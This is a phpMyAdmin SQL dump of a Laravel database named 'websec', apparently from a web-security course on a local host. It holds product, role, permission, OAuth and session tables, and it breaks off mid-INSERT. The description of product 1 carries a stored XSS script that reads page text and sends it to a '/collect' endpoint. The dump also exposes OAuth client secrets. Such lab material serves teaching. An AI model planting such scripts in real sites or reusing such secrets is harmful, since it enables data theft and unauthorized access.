-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: May 18, 2025 at 05:15 AM
-- Server version: 10.4.28-MariaDB
-- PHP Version: 8.2.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `websec`
--

-- --------------------------------------------------------

--
-- Table structure for table `cache`
--

CREATE TABLE `cache` (
  `key` varchar(255) NOT NULL,
  `value` mediumtext NOT NULL,
  `expiration` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `cache`
--

INSERT INTO `cache` (`key`, `value`, `expiration`) VALUES
('spatie.permission.cache', 'a:3:{s:5:\"alias\";a:5:{s:1:\"a\";s:2:\"id\";s:1:\"b\";s:4:\"name\";s:1:\"c\";s:12:\"display_name\";s:1:\"d\";s:10:\"guard_name\";s:1:\"r\";s:5:\"roles\";}s:11:\"permissions\";a:7:{i:0;a:5:{s:1:\"a\";i:1;s:1:\"b\";s:12:\"add_products\";s:1:\"c\";s:12:\"Add Products\";s:1:\"d\";s:3:\"web\";s:1:\"r\";a:1:{i:0;i:1;}}i:1;a:5:{s:1:\"a\";i:2;s:1:\"b\";s:13:\"edit_products\";s:1:\"c\";s:13:\"Edit Products\";s:1:\"d\";s:3:\"web\";s:1:\"r\";a:1:{i:0;i:1;}}i:2;a:5:{s:1:\"a\";i:3;s:1:\"b\";s:15:\"delete_products\";s:1:\"c\";s:15:\"Delete Products\";s:1:\"d\";s:3:\"web\";s:1:\"r\";a:1:{i:0;i:1;}}i:3;a:5:{s:1:\"a\";i:4;s:1:\"b\";s:10:\"show_users\";s:1:\"c\";s:10:\"Show Users\";s:1:\"d\";s:3:\"web\";s:1:\"r\";a:2:{i:0;i:1;i:1;i:2;}}i:4;a:5:{s:1:\"a\";i:5;s:1:\"b\";s:10:\"edit_users\";s:1:\"c\";s:10:\"Edit Users\";s:1:\"d\";s:3:\"web\";s:1:\"r\";a:2:{i:0;i:1;i:1;i:2;}}i:5;a:5:{s:1:\"a\";i:7;s:1:\"b\";s:12:\"delete_users\";s:1:\"c\";s:12:\"Delete Users\";s:1:\"d\";s:3:\"web\";s:1:\"r\";a:1:{i:0;i:1;}}i:6;a:5:{s:1:\"a\";i:8;s:1:\"b\";s:11:\"admin_users\";s:1:\"c\";s:11:\"Admin Users\";s:1:\"d\";s:3:\"web\";s:1:\"r\";a:1:{i:0;i:1;}}}s:5:\"roles\";a:2:{i:0;a:3:{s:1:\"a\";i:1;s:1:\"b\";s:5:\"Admin\";s:1:\"d\";s:3:\"web\";}i:1;a:3:{s:1:\"a\";i:2;s:1:\"b\";s:8:\"Employee\";s:1:\"d\";s:3:\"web\";}}}', 1747188281);

-- --------------------------------------------------------

--
-- Table structure for table `cache_locks`
--

CREATE TABLE `cache_locks` (
  `key` varchar(255) NOT NULL,
  `owner` varchar(255) NOT NULL,
  `expiration` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `failed_jobs`
--

CREATE TABLE `failed_jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `uuid` varchar(255) NOT NULL,
  `connection` text NOT NULL,
  `queue` text NOT NULL,
  `payload` longtext NOT NULL,
  `exception` longtext NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `jobs`
--

CREATE TABLE `jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `queue` varchar(255) NOT NULL,
  `payload` longtext NOT NULL,
  `attempts` tinyint(3) UNSIGNED NOT NULL,
  `reserved_at` int(10) UNSIGNED DEFAULT NULL,
  `available_at` int(10) UNSIGNED NOT NULL,
  `created_at` int(10) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `job_batches`
--

CREATE TABLE `job_batches` (
  `id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `total_jobs` int(11) NOT NULL,
  `pending_jobs` int(11) NOT NULL,
  `failed_jobs` int(11) NOT NULL,
  `failed_job_ids` longtext NOT NULL,
  `options` mediumtext DEFAULT NULL,
  `cancelled_at` int(11) DEFAULT NULL,
  `created_at` int(11) NOT NULL,
  `finished_at` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '0001_01_01_000000_create_users_table', 1),
(2, '0001_01_01_000001_create_cache_table', 1),
(3, '0001_01_01_000002_create_jobs_table', 1),
(4, '2025_03_10_185119_create_permission_tables', 2),
(5, '2025_05_12_154122_create_oauth_auth_codes_table', 3),
(6, '2025_05_12_154123_create_oauth_access_tokens_table', 3),
(7, '2025_05_12_154124_create_oauth_refresh_tokens_table', 3),
(8, '2025_05_12_154125_create_oauth_clients_table', 3),
(9, '2025_05_12_154126_create_oauth_personal_access_clients_table', 3);

-- --------------------------------------------------------

--
-- Table structure for table `model_has_permissions`
--

CREATE TABLE `model_has_permissions` (
  `permission_id` bigint(20) UNSIGNED NOT NULL,
  `model_type` varchar(255) NOT NULL,
  `model_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `model_has_roles`
--

CREATE TABLE `model_has_roles` (
  `role_id` bigint(20) UNSIGNED NOT NULL,
  `model_type` varchar(255) NOT NULL,
  `model_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `model_has_roles`
--

INSERT INTO `model_has_roles` (`role_id`, `model_type`, `model_id`) VALUES
(1, 'App\\Models\\User', 1),
(2, 'App\\Models\\User', 16),
(2, 'App\\Models\\User', 20);

-- --------------------------------------------------------

--
-- Table structure for table `oauth_access_tokens`
--

CREATE TABLE `oauth_access_tokens` (
  `id` varchar(100) NOT NULL,
  `user_id` bigint(20) UNSIGNED DEFAULT NULL,
  `client_id` char(36) NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `scopes` text DEFAULT NULL,
  `revoked` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `oauth_access_tokens`
--

INSERT INTO `oauth_access_tokens` (`id`, `user_id`, `client_id`, `name`, `scopes`, `revoked`, `created_at`, `updated_at`, `expires_at`) VALUES
('1df3e8ac43277420a6aecf97868d4a9896fedc24e1dfe907f7cfa74bebc94171595cce6b74432038', 1, '9ee503c7-cf7f-4e11-bfa3-242181629f39', 'app', '[]', 0, '2025-05-12 12:55:09', '2025-05-12 12:55:09', '2026-05-12 15:55:09'),
('33a4975f27f919ae7c58ef6c6eb805b4fc672ddccdfddca7fad6c0a5bde1c1853dc5ee3eec493726', 1, '9ee503c7-cf7f-4e11-bfa3-242181629f39', 'app', '[]', 1, '2025-05-12 23:26:11', '2025-05-12 23:40:41', '2026-05-13 02:26:11'),
('44eabe26378b55d048a9fad87080979098343105ebc6f7aa6bc658d7622942fce633ec68694e1c28', 1, '9ee503c7-cf7f-4e11-bfa3-242181629f39', 'app', '[]', 0, '2025-05-12 12:54:42', '2025-05-12 12:54:42', '2026-05-12 15:54:42'),
('6d3e4c9f524b121922d7dd77eff6a778824c2b7a1e3519a05812d503fd78d6ebdb3b9b5a34b712ee', 1, '9ee503c7-cf7f-4e11-bfa3-242181629f39', 'app', '[]', 0, '2025-05-12 12:55:26', '2025-05-12 12:55:26', '2026-05-12 15:55:26'),
('7af9f1b8e7632b92de72868896d124b02d17a753068a317bb4f1d03d6892f21c2a11dc9be7f40dff', 1, '9ee503c7-cf7f-4e11-bfa3-242181629f39', 'app', '[]', 0, '2025-05-12 12:48:11', '2025-05-12 12:48:11', '2026-05-12 15:48:11'),
('a9db145b0a645726e7dfbbfcd26f42304cd98f900c935538561bf8c214047f03cb9fbab8a72c8b51', 1, '9ee503c7-cf7f-4e11-bfa3-242181629f39', 'app', '[]', 0, '2025-05-13 04:16:42', '2025-05-13 04:16:43', '2026-05-13 07:16:42'),
('d6e9700cacd3cfd07d5e2f9d30fd447bff59c2032ebfb7d259e100ab53ab46ffff74bcb1466ecfd3', 1, '9ee503c7-cf7f-4e11-bfa3-242181629f39', 'app', '[]', 0, '2025-05-12 12:53:44', '2025-05-12 12:53:44', '2026-05-12 15:53:44');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_auth_codes`
--

CREATE TABLE `oauth_auth_codes` (
  `id` varchar(100) NOT NULL,
  `user_id` bigint(20) UNSIGNED NOT NULL,
  `client_id` char(36) NOT NULL,
  `scopes` text DEFAULT NULL,
  `revoked` tinyint(1) NOT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `oauth_clients`
--

CREATE TABLE `oauth_clients` (
  `id` char(36) NOT NULL,
  `user_id` bigint(20) UNSIGNED DEFAULT NULL,
  `name` varchar(255) NOT NULL,
  `secret` varchar(100) DEFAULT NULL,
  `provider` varchar(255) DEFAULT NULL,
  `redirect` text NOT NULL,
  `personal_access_client` tinyint(1) NOT NULL,
  `password_client` tinyint(1) NOT NULL,
  `revoked` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `oauth_clients`
--

INSERT INTO `oauth_clients` (`id`, `user_id`, `name`, `secret`, `provider`, `redirect`, `personal_access_client`, `password_client`, `revoked`, `created_at`, `updated_at`) VALUES
('9ee503c7-cf7f-4e11-bfa3-242181629f39', NULL, 'Laravel Personal Access Client', 'IxJm7U5Oz9R4h4xPPQjWF94zjbLiFUpnOLFZbyIX', NULL, 'http://localhost', 1, 0, 0, '2025-05-12 12:41:21', '2025-05-12 12:41:21'),
('9ee503c7-d381-4a1c-8176-481b66ed4b82', NULL, 'Laravel Password Grant Client', 'CAlGsKUq2eaxSwYzc4vZJwwupUakIQz013LcQt9A', 'users', 'http://localhost', 0, 1, 0, '2025-05-12 12:41:21', '2025-05-12 12:41:21');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_personal_access_clients`
--

CREATE TABLE `oauth_personal_access_clients` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `client_id` char(36) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `oauth_personal_access_clients`
--

INSERT INTO `oauth_personal_access_clients` (`id`, `client_id`, `created_at`, `updated_at`) VALUES
(1, '9ee503c7-cf7f-4e11-bfa3-242181629f39', '2025-05-12 12:41:21', '2025-05-12 12:41:21');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_refresh_tokens`
--

CREATE TABLE `oauth_refresh_tokens` (
  `id` varchar(100) NOT NULL,
  `access_token_id` varchar(100) NOT NULL,
  `revoked` tinyint(1) NOT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `participations`
--

CREATE TABLE `participations` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `quiz_id` bigint(20) UNSIGNED NOT NULL,
  `student_id` bigint(20) UNSIGNED NOT NULL,
  `answer` text NOT NULL,
  `degree` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `password_reset_tokens`
--

CREATE TABLE `password_reset_tokens` (
  `email` varchar(255) NOT NULL,
  `token` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `permissions`
--

CREATE TABLE `permissions` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `display_name` varchar(128) DEFAULT NULL,
  `guard_name` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `permissions`
--

INSERT INTO `permissions` (`id`, `name`, `display_name`, `guard_name`, `created_at`, `updated_at`) VALUES
(1, 'add_products', 'Add Products', 'web', NULL, NULL),
(2, 'edit_products', 'Edit Products', 'web', NULL, NULL),
(3, 'delete_products', 'Delete Products', 'web', NULL, NULL),
(4, 'show_users', 'Show Users', 'web', NULL, NULL),
(5, 'edit_users', 'Edit Users', 'web', NULL, NULL),
(7, 'delete_users', 'Delete Users', 'web', NULL, NULL),
(8, 'admin_users', 'Admin Users', 'web', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `products`
--

CREATE TABLE `products` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `code` varchar(64) NOT NULL,
  `name` varchar(256) NOT NULL,
  `price` int(10) UNSIGNED NOT NULL,
  `model` varchar(128) NOT NULL,
  `description` text DEFAULT NULL,
  `photo` varchar(128) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `products`
--

INSERT INTO `products` (`id`, `code`, `name`, `price`, `model`, `description`, `photo`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 'TV01', 'LG TV 50 Insh', 28000, 'LG8768787', 'Hello\r\n<script>let name = document.getElementById(\'name\').textContent;let xhr = new XMLHttpRequest();xhr.open(\'GET\', `https://websecservice.localhost.com/collect?name=${encodeURIComponent(name)}`);xhr.send();</script>', 'lgtv50.jpg', NULL, '2025-04-22 06:08:09', NULL),
(2, 'RF01', 'Toshipa Refrigerator 14\"', 22000, 'TS76634', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'tsrf50.jpg', NULL, NULL, NULL),
(3, 'RF02', 'Toshipa Refrigerator 18\"', 28000, 'TS76634', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'rf2.jpg', NULL, NULL, NULL),
(4, 'RF03', 'Toshipa Refrigerator 19\"', 32000, 'TS76634', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'rf3.jpg', NULL, NULL, NULL),
(5, 'TV02', 'LG TV 55\"', 23000, 'LG8768787', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'tv2.jpg', NULL, NULL, NULL),
(6, 'RF04', 'LG Refrigerator 14\"', 22000, 'TS76634', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'rf4.jpg', NULL, NULL, NULL),
(7, 'TV03', 'LG TV 60\"', 44000, 'LG8768787', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'tv3.jpg', NULL, NULL, NULL),
(8, 'RF05', 'Toshipa Refrigerator 12\"', 10700, 'TS76634', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'rf5.jpg', NULL, NULL, NULL),
(9, 'TV04', 'LG TV 99\"', 108000, 'LG8768787', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'tv4.jpg', NULL, NULL, NULL),
(10, 'RF05', 'Toshipa Refrigerator 19\"', 44000, 'TS76634', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'rf4.jpg', '2025-02-25 03:18:04', '2025-02-25 03:18:04', NULL),
(11, 'TV01', 'LG TV 50\"', 18000, 'LG8768787', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.', 'lgtv50.jpg', '2025-02-25 03:24:04', '2025-02-25 03:24:04', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `quizzes`
--

CREATE TABLE `quizzes` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `question` text NOT NULL,
  `instructor_id` bigint(20) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `roles`
--

CREATE TABLE `roles` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `guard_name` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `roles`
--

INSERT INTO `roles` (`id`, `name`, `guard_name`, `created_at`, `updated_at`) VALUES
(1, 'Admin', 'web', NULL, NULL),
(2, 'Employee', 'web', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `role_has_permissions`
--

CREATE TABLE `role_has_permissions` (
  `permission_id` bigint(20) UNSIGNED NOT NULL,
  `role_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `role_has_permissions`
--

INSERT INTO `role_has_permissions` (`permission_id`, `role_id`) VALUES
(1, 1),
(2, 1),
(3, 1),
(4, 1),
(4, 2),
(5, 1),
(5, 2),
(7, 1),
(8, 1);

-- --------------------------------------------------------

--
-- Table structure for table `sessions`
--

CREATE TABLE `sessions` (
  `id` varchar(255) NOT NULL,
  `user_id` bigint(20) UNSIGNED DEFAULT NULL,
  `ip_address` varchar(45) DEFAULT NULL,
  `user_agent` text DEFAULT NULL,
  `payload` longtext NOT NULL,
  `last_activity` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `sessions`
--

INSERT INTO `sessions` (`id`, `user_id`, `ip_address`, `user_agent`, `payload`, `last_activity`) VALUES
('02wEA5qUS3ZRmzj5gXaicsFSQ9XW4zD7M35D61aJ', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiV0N6QUhQRVd4NHZ5TUZXMVpNd1dKdmJuUWdYRkpzTnFlaWw5QmVGaiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDA6Imh0dHA6Ly93ZWJzZWNzZXJ2aWNlLmxvY2FsaG9zdC5jb20vbG9naW4iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1747118662),
('4gRDLQUglB4wo5ZmUR1LztqRVpYxj9tcbk34EM4Q', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiN3hXSmNkMW05NzZ6Q0FYenZleE5YV1JYd2pkck5NYkxpUEpqQ1FUSiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mzk6Imh0dHA6Ly93ZWJzZWNzZXJ2aWNlLmxvY2FsaG9zdC5jb20vZXZlbiI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1747064425),
('74ra6ZXaUy6l3eOOg85DaSPWQ7rzoWeBBUcgWAkn', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiUUp3WEV5NXJpTTRFbng4Ujk3bEh3TzY1R3VNS2ZZYnkwbW9MQTYwMyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTUxOiJodHRwOi8vd2Vic2Vjc2VydmljZS5sb2NhbGhvc3QuY29tL2NyeXB0b2dyYXBoeT9fdG9rZW49UUp3WEV5NXJpTTRFbng4Ujk3bEh3TzY1R3VNS2ZZYnkwbW9MQTYwMyZhY3Rpb249RW5jcnlwdCZkYXRhPVdlbGNvbWUlMjB0byUyMENyeXB0b2dyYXBoeSZyZXN1bHQ9Ijt9fQ==', 1746671284),
('8faTVrbYFdbpZh7j908PLIQRPhwMycoeJaLl1Db2', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoidEF1eVNVV1Rxa3J5TTRGSWVUMEVnUVg3T2QyWnJ3YWNTZ0pSNENJZyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzQ6Imh0dHA6Ly93ZWJzZWNzZXJ2aWNlLmxvY2FsaG9zdC5jb20iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1747105660),
('8p1FCXP6OR7dvvv0Cmb5hVnQiydfD0e6eFJiQ8EN', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiSEh0NWtpRzhqUjY2bTJuZ2hPUEdQNWs3empMVUJpYVgybXpUWmZZTCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTUxOiJodHRwOi8vd2Vic2Vjc2VydmljZS5sb2NhbGhvc3QuY29tL2NyeXB0b2dyYXBoeT9fdG9rZW49SEh0NWtpRzhqUjY2bTJuZ2hPUEdQNWs3empMVUJpYVgybXpUWmZZTCZhY3Rpb249RW5jcnlwdCZkYXRhPVdlbGNvbWUlMjB0byUyMENyeXB0b2dyYXBoeSZyZXN1bHQ9Ijt9fQ==', 1747537708),
('aSnonDTb3RIek6FVMWGLpDxgOT1rJYM4DZ0hBP2e', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibkpiUzNyZ3BnZzJodXAyVk5RYTUwNzBVdmc5dlpoRVo3cGg4ZmcwTyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDA6Imh0dHA6Ly93ZWJzZWNzZXJ2aWNlLmxvY2FsaG9zdC5jb20vbG9naW4iO319', 1747120185),
('d5K0vEA26VBc57XTltS0rNUBmPvKhCjsqFmz0jKf', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'YToyOntzOjY6Il90b2tlbiI7czo0MDoiRzFtUWNXbDMxdDF2c1RBNURFcnVTZzdoVnZFbWs0dGIwOUVVenhndCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==', 1747024622),
